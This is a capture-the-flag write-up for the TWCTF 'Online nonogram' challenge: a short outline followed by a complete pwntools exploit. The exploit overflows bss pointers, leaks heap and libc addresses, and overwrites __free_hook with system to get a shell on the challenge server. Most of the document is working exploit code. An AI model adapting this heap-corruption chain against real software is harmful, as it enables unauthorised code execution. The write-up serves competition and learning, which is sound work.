# TWCTF

## Online nonogram

1. Overflow into vec_puzzle pointers stored in bss.
2. Leak heap by playing puzzle.
3. Heap voodo to get `__free_hook` -> system
4. Control the world.


```python
#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import math
import random

''' ( ͡° ͜ʖ ͡°) '''
def addpuzzle(title,size,puzzle):
	io.sendlineafter('input: ','2')
	io.sendlineafter('Title: ',title)
	io.sendlineafter('Size: ',str(size))
	io.sendafter('Puzzle: ',puzzle)

def deletepuzzle(idx):
	io.sendlineafter('input: ','3')
	io.sendlineafter('Index:',str(idx))

def showpuzzle(idx,n):
	io.sendlineafter('input: ','4')
	data = io.recvlines(n)
	io.sendlineafter('Index:',str(idx))
	return data

def get_size(n):
	return int(math.sqrt((n-1)<<3))+1

def playpuzzle(idx):
	io.sendlineafter('input: ','1')
	io.sendlineafter('Index:',str(idx))

''' '̿̿ ̿̿ ̿̿ ̿'̿\̵͇̿̿\з= ( ▀ ͜͞ʖ▀) =ε/̵͇̿̿/’̿’̿ ̿ ̿̿ ̿̿ ̿̿ '''
'''
	|   0x4	|  0x4	|  0x4	|  0x4	|
-----------------------------------------
0x10	|    size 	|    puzzle	|
0x20	|    title	|      size	|
0x30	|   title_buf	|       ?	|
0x40	|	?	|	?	|
-----------------------------------------
'''

''' '̿'̿\̵͇̿̿\з=( ͠° ͟ʖ ͡°)=ε/̵͇̿̿/'̿̿ ̿ ̿ ̿ ̿ ̿ '''
large_bin_offset = 0x1ebff0
__free_hook = 0x1eeb28
__malloc_hook = 0x1ebb70
system = 0x55410

''' (▀̿Ĺ̯▀̿ ̿) '''
sh = 'sh\0'

''' (ง ͠° ͟ل͜ ͡°)ง '''
if __name__ == '__main__':
# (ᵔᴥᵔ)	io = process('./nono_ld',env={'LD_PRELOAD':'./libc-59e53203baf0667facd95946d27239694359e09e0cd71aa11355918cdfd7b2ae.so.6'})
	io = remote('pwn03.chal.ctf.westerns.tokyo',22915)
	addpuzzle("HK", get_size(0x80), "HK") #2
	addpuzzle("HK", get_size(1024+8), p64(0)*20) #3

	playpuzzle(3)
	io.recvuntil("Row")
	io.recvline()
	hr = []
	vr = []
	while True:
		d = str(io.recvuntil("\n", drop=True), 'utf-8')
		if d[-1] == ',':
			d = d[:-1]
		if 'Col' in d:
			break
		d = list(map(int, d.split(",")))
		hr.append(d)
	while True:
		d = str(io.recvuntil("\n", drop=True), 'utf-8')
		if d[-1] == ',':
			d = d[:-1]
		if 'Cur' in d:
			break
		d = list(map(int, d.split(",")))
		vr.append(d)

	b = ""
	for i in range(64):
		b += str(hr[i][0])
	heap_leak = int(hex(int(b[::-1],2) << 2)[:-1],0)
	io.sendline('A')
	print(f'Heap: {heap_leak:#x}')

	addpuzzle('HKHK',0x60,'A'*0x400) #4
	addpuzzle('HKHK',0x30,
			(p64(0x0)*4+\
			p64(0)+p64(0x41)+\
			p64(0x0)+p64(heap_leak+0xa60)+\
			p64(heap_leak+0xac0)+p64(0x8)+\
			p64(0)*2+\
			p64(0)+p64(0x61)+\
			p64(0)*10+\
			p64(0)+p64(0x61)).ljust(0x100,b'A'))#5

	deletepuzzle(4)
	L_STR = p64(0x0)*4+\
		p64(0x0)+p64(0x51)+\
		p64(heap_leak+0xc20)+p64(heap_leak+0xbe0)+\
		p64(heap_leak-0xd0)+p64(heap_leak+0x30)+\
		p64(heap_leak+0xba0)+p64(heap_leak+0xa20)+\
		p64(heap_leak+0xba0)*2+\
		p64(0x0)+p64(0x41)+\
		p64(0x60)+p64(heap_leak+0x4d0)+\
		p64(heap_leak+0x4d0)+p64(0x8)+\
		p64(0x0)*2+\
		p64(0x0)+p64(0x41)+\
		p64(0x0)+p64(heap_leak+0x9f0)+\
		p64(heap_leak+0xc00)+p64(0x8)+\
		p64(0x0)*2+\
		p64(0x0)+p64(0x41)+\
		p64(0x0)+p64(heap_leak+0xac0)+\
		p64(heap_leak+0xac0)+p64(0x10)+\
		p64(0x0)+p64(0x0)+\
		p64(0x0)+p64(0x21)
	addpuzzle('BBBB',0x70,L_STR.ljust(0x400,b'\x00')+p64(heap_leak+0xb50)+p64(heap_leak+0xb90)+p64(heap_leak+0xba0)) #5
	large_bin = u64(showpuzzle(10,6)[4].split(b':')[1][1:][:-4])
	libc_base = large_bin-large_bin_offset
	print(f'Libc: {libc_base:#x}')

	deletepuzzle(5)
	deletepuzzle(1)
	addpuzzle('HK',0x30,p64(0x0)*5+p64(0x41)+p64(0x0)*7+p64(0x61)+p64(0x0)*11+p64(0x61)+p64(libc_base+__free_hook))

	addpuzzle('HK',0x18,f'{sh}▄︻┻̿═━一')

	addpuzzle('HK',0x18,p64(libc_base+system))
	io.sendlineafter('input: ','3')
	io.interactive()
#	TWCTF{watashi_puzzle_daisuki_mainiti_yatteru}
```
